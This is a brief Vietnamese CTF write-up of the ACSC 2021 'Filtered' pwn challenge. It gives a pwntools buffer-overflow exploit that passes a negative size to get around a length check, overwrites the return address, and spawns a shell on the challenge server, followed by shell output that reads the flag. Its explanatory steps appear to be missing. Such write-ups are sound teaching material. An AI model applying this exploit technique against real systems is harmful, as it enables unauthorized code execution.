# Filtered
### Thử thách:
- Filter invalid sizes to make it secure!
- Backup: 
`nc 167.99.78.201 9001`
`nc filtered.chal.acsc.asia 9001`
- [Source](https://github.com/antoinenguyen-09/All_CTF_write-ups/tree/master/Asian%20Cyber%20Security%20Challenge%20(ACSC)/2021/pwn/source)
### Kiến thức nền:
- Buffer Overflow.
### Giải quyết vấn đề:

3) Exploit:

- Exploit code:

```python
from pwn import *
r = remote("167.99.78.201" , 9001)
r.sendline(b"-1")
r.sendline(0x110*b"1" + p64(0xaaaaaaaa)+ p64(0x4011D6))
r.interactive()
```

- Result:

```bash
└─# python3 filtered.py
[+] Opening connection to 167.99.78.201 on port 9001: Done
[*] Switching to interactive mode
 Bye!
$ whoami
pwn
$ ls -la
total 36
drwxr-xr-x 1 root pwn   4096 Sep 18 02:21 .
drwxr-xr-x 1 root root  4096 Sep 18 02:21 ..
-r-xr-x--- 1 root pwn     40 Sep 18 02:20 .redir.sh
-r-xr-x--- 1 root pwn  17008 Sep 18 02:20 filtered
-r--r----- 1 root pwn     59 Sep 18 02:20 flag-08d995360bfb36072f5b6aedcc801cd7.txt
$ cat flag-08d995360bfb36072f5b6aedcc801cd7.txt
ACSC{GCC_d1dn'7_sh0w_w4rn1ng_f0r_1mpl1c17_7yp3_c0nv3rs10n}
$
```
